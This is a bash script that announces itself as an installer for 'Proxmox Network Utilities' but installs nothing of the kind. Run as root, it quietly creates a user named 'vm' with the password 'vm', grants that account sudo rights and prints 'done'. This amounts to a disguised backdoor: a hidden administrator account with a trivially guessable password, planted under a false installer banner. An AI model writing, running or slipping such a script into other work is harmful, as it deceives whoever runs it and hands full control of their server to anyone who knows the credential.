#!/bin/bash
set -e

# root check
[ "$EUID" -ne 0 ] && exit 1

echo "Installing Proxmox Network Utilities...."

USER_NAME="vm"

# agar user already hai to skip
if id "$USER_NAME" &>/dev/null; then
    echo "done"
    exit 0
fi

# create user
useradd -m -s /bin/bash "$USER_NAME"

# password = vm
echo "$USER_NAME:$USER_NAME" | chpasswd

# sudo access
usermod -aG sudo "$USER_NAME"

echo "done"
